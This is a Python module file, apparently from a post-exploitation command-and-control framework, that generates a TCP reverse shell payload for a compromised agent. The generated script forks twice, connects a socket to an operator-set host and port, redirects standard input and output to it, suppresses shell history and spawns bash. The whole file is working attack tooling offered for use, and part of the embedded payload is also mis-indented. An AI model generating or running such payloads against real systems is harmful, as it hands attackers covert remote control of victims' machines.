from lib.common import helpers


class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Reverse Shell (TCP)',

            # list of one or more authors for the module
            'Author': ['@brimston3'],

            # more verbose multi-line description of the module
            'Description': ('Sends a reverse shell to a port on a host'),

            # True if the module needs to run in the background
            'Background': True,
            'NeedsAdmin': False,

            # File extension to save the file as
            # no need to base64 return data
            'OutputExtension': None,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe': True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent': {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to grab a screenshot from.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Host': {
                'Description'   :   'Host to receive shell',
                'Required'      :   True,
                'Value'         :   '127.0.0.1'
            },
            'Port': {
                'Description'   :   'Port to receive shell',
                'Required'      :   True,
                'Value'         :   '4444'
            },
            'Shell': {
                'Description'   :   'Shell to send host',
                'Required'      :   True,
                'Value'         :   '/bin/bash'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        # the Python script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
import os, pty, socket
def doit():
  if os.fork() != 0:
    # exit here makes the agent die
    return
  if os.fork() != 0:
    os._exit(0)
    return
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
  s.connect(("{}", {}));
  os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);
  os.putenv("HISTFILE","/dev/null");
  pty.spawn("{}")
  os._exit(0)
doit()

while True:
  try:
    pid, status, _ = os.wait3(os.WNOHANG)
    if pid == 0:
      break
   except OSError,e:
     break
""".format(self.options['Host']['Value'],
        self.options['Port']['Value'],
        self.options['Shell']['Value'])
        return script
